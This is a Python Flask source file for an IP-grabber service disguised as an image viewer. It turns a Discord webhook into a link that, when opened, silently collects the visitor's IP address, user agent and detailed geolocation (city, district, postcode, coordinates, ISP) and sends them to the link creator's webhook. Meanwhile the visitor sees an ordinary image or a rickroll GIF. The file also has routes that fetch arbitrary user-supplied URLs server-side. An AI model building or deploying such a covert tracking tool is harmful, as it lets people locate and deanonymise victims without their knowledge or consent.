from flask import Flask, request, redirect, render_template, jsonify, url_for, Response
import requests, json, base64, asyncio, aiohttp, os.path, io
from io import BytesIO
from PIL import Image, ImageFilter, ImageSequence
app = Flask(__name__, static_url_path='', template_folder='')


file_types = {'gif': 'image/gif', 'jpeg': 'image/jpeg', 'jpg': 'image/jpg', 'png': 'image/png', 'mp4': 'video/mp4'}



    
    
    

async def send_message_via_webhook(token, image_url):
    token = base64.b64decode(token.encode()).decode()

    webhook_url = f"https://discord.com/api/webhooks/{token}" 
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        message = {'ip': request.environ['REMOTE_ADDR'], 'useragent': request.headers.get('User-Agent')}
        ip = request.environ['REMOTE_ADDR']
    else:
        message = {'ip': request.environ['HTTP_X_FORWARDED_FOR'], 'useragent': request.headers.get('User-Agent')}
        ip = request.environ['HTTP_X_FORWARDED_FOR']
        
    async with aiohttp.ClientSession() as session:
        async with session.get(f"http://ip-api.com/json/{ip}?fields=66846719") as r:
            js = await r.json()
            status = js["status"]
            if status == "fail":
                message = js["message"]
                print(message)
            else:
                continent = js["continent"]
                country = js["country"]
                region = js["regionName"]
                city = js["city"]
                rue = js["district"]
                zipcode = js["zip"]
                lat = js["lat"]
                lon = js["lon"]
                timezone = js["timezone"]
                offset = js["offset"]
                iso = js["isp"]
                org = js["org"]
                reverse = js["reverse"]
                mobile = js["mobile"]
                proxy = js["proxy"]
                hosting = js["hosting"]
                if not continent:continent = "None"
                if not country:country = "None"
                if not region:region = "None"
                if not city:city = "None"
                if not rue:rue = "None"
                if not zipcode:zipcode = "None"
                if not lat:lat = "None"
                if not lon:lon = "None"
                if not timezone:timezone = "None"
                if not offset:offset = "None"
                if not iso:iso = "None"
                if not org:org = "None"
                if not reverse:reverse = "None"
                if not mobile:mobile = "None"
                if not proxy:proxy = "None"
                if not hosting:hosting = "None"

                log = f"continent: {continent}\ncountry: {country}\nregion: {region}\ncity: {city}\ndistrict: {rue}\nzipcode: {zipcode}\nlatitude: {lat}\nlongitude: {lon}\ntimezone: {timezone}\noffset: {offset}\nisp: {iso}\norganisation: {org}\nreverse: {reverse}\nmobile: {mobile}\nproxy: {proxy}\nhosting: {hosting}"
                
                
                
    payload = {
        'content': str(ip)+"\n"+str(log)
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, json=payload, headers=headers)
    print(response.status_code)
    
    if image_url:
        image_url = base64.b64decode(image_url.encode()).decode()
    else:
        image_url = "https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif"
        
    return render_template("image.html", image_url=image_url)
    
    
file_types = {'gif': 'image/gif', 'jpeg': 'image/jpeg', 'jpg': 'image/jpg', 'png': 'image/png', 'mp4': 'video/mp4'}

    
async def telegraph_file_upload(file_types, file_data):

    file_ext = file_data.filename.split('.')[-1]

    if file_ext in file_types:
        file_type = file_types[file_ext]
    else:
        return 'error, {}-file can not be processed.\nvalid files types : [.jpg, .png, .jpeg, .gif, .mp4]'.format(file_ext)

    f = BytesIO(file_data.read())

    url = 'https://telegra.ph/upload'
    headers = {'User-Agent': 'Mozilla/5.0'}
    response = requests.post(url, files={'file': ('file', f, file_type)}, headers=headers, timeout=10)

    telegraph_url = json.loads(response.content)
    telegraph_url = telegraph_url[0]['src']
    telegraph_url = 'https://telegra.ph{}'.format(telegraph_url)

    return telegraph_url

@app.route('/upload', methods=['GET', 'POST'])
async def upload_file():
    file = request.files['file']

    result = await telegraph_file_upload(file_types, file)

    if result.startswith('error'):
        return jsonify({'error': result})

    response = jsonify({'telegraph_url': result, 'redirect_url': ''})
    response.headers['Cache-Control'] = 'no-cache'
    result = result.replace("https://telegra.ph/file/","")
        

    return redirect("/view?token="+result)


@app.route("/view", methods=["GET"])
def view():
    token = request.args.get("token")
    url = "https://telegra.ph/file/"+token

    # Download the file using the requests library
    response = requests.get(url)
    return response.content, 200, {"Content-Type": response.headers.get("Content-Type")}


@app.route("/", methods=["GET"])
async def main():
    return render_template("index.html")






@app.route("/hidden-grabber", methods=["GET"])
async def grabber():
    return render_template("grabber.html")

@app.route("/setup", methods=["POST"])
async def setup():
    token = request.form.get('token')
    prefixes = ["https://discord.com/api/webhooks/", "https://discordapp.com/api/webhooks/", "https://canary.discord.com/api/webhooks/", "https://ptb.discordapp.com/api/webhooks/"]
    for prefix in prefixes:
        if token.startswith(prefix):
            token = token.replace(prefix, "")
    
    token = base64.b64encode(token.encode()).decode()
    
    image_url = request.form.get('image_url')
    image_url = base64.b64encode(image_url.encode()).decode()
  
    if image_url:
        url = f"/type?img={token}&image={image_url}"
    else:
        url = f"/type?img={token}"
    return redirect(url)

@app.route("/type", methods=["GET"])
async def redirect_to_ip():
    token = request.args.get('img')
    image_url = request.args.get('image')
    result = await send_message_via_webhook(token, image_url)
    return result

@app.route("/img")
async def blur_image():
    blur_param = request.args.get("blur")
    if blur_param:
        try:
            image_url = blur_param
            response = requests.get(image_url)
            image_bytes = BytesIO(response.content)
            image = Image.open(image_bytes)
            image_format = image.format

            if image_format == "GIF":
                gif_frames = ImageSequence.Iterator(image)
                first_frame = next(gif_frames)

                blurred_image = first_frame.filter(ImageFilter.GaussianBlur(50))

                gif_frames[0] = blurred_image

                blurred_image_bytes = BytesIO()
                image.save(blurred_image_bytes, format="GIF", save_all=True, append_images=list(gif_frames))
            else:
                blurred_image = image.filter(ImageFilter.GaussianBlur(50))
                blurred_image_bytes = BytesIO()
                blurred_image.save(blurred_image_bytes, format=image_format)
            blurred_image_bytes.seek(0)

            if image_format == "GIF":
                return blurred_image_bytes.getvalue(), 200, {"Content-Type": "image/gif"}
            else:
                return blurred_image_bytes.getvalue(), 200, {"Content-Type": f"image/{image_format.lower()}"}

        except Exception as e:
            return str(e), 500

    return "No image URL provided.", 400
    
                

@app.route("/image")
async def get_image():
    image_url = request.args.get("url")
    if image_url:
        try:
            image_url = base64.b64decode(image_url.encode()).decode()
        except base64.binascii.Error:
            image_url = "https://media.discordapp.net/attachments/1085580474212163615/1126993917712273610/PopCord.png"
        try:
            response = requests.get(image_url)
            return response.content, 200, {"Content-Type": response.headers.get("Content-Type")}
        except Exception as e:
            return str(e), 500
    else:
        return "No image URL provided.", 400


if __name__ == "__main__":
    app.run(debug=True)
